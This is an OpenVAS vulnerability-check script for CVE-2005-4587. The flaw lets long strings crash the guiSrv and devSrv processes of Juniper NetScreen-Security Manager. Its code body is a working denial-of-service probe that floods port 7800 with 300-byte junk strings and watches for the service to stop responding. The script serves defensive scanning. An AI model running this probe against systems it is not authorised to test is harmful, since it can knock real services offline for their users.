###############################################################################
# OpenVAS Vulnerability Test
# $Id: nsm2004_dos.nasl 4914 2017-01-02 14:20:54Z cfi $
#
# Juniper NetScreen-Security Manager Remote DoS flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2006 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20388");
  script_version("$Revision: 4914 $");
  script_tag(name:"last_modification", value:"$Date: 2017-01-02 15:20:54 +0100 (Mon, 02 Jan 2017) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_bugtraq_id(16075);
  script_cve_id("CVE-2005-4587");
  script_xref(name:"OSVDB", value:"22047");
  script_name("Juniper NetScreen-Security Manager Remote DoS flaw");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2006 David Maciejak");
  script_dependencies("find_service.nasl");
  script_require_ports(7800, 7801);

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-12/1281.html");
  script_xref(name:"URL", value:"http://www.juniper.net/customers/support/products/nsm.jsp");

  tag_summary = "The version of Juniper NetScreen-Security Manager (NSM) installed on
  the remote host may allow an attacker to deny service to legitimate
  users using specially-crafted long strings to the guiSrv and devSrv
  processes. A watchdog service included in Juniper NSM, though,
  automatically restarts the application.";

  tag_impact = "By repeatedly sending a malformed request, an attacker may permanently
  deny access to legitimate users.";

  tag_solution = "Upgrade to Juniper NSM version 2005.1";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  exit(0);
}

port = 7800;
if( ! get_port_state( port ) ) exit( 0 );
soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

nbtest = 50;
cz = raw_string( 0xff, 0xed, 0xff, 0xfd, 0x06 );
teststr = crap( 300 ) + '\r\n';

send( socket:soc, data:cz + '\r\n' );
while( nbtest-- > 0 ) {
  send( socket:soc, data:teststr );
  soc2 = open_sock_tcp( port );
  if( ! soc2 ) {
    security_message( port:port );
    exit( 0 );
  }
  close( soc2 );
}

exit( 99 );